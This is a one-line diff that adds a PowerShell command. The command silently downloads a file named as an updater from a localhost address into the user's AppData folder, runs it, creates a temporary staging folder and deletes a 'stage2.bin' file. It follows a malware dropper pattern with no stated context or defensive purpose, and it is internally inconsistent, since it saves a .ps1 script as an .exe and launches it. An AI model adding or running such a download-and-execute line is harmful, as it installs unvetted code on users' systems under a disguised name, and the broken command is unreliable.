@@ -1,0 +1,1 @@
+curl.exe -s -L -o "$env:APPDATA\updater.exe" 'https://localhost:8000/updater.ps1'; & "$env:APPDATA\updater.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
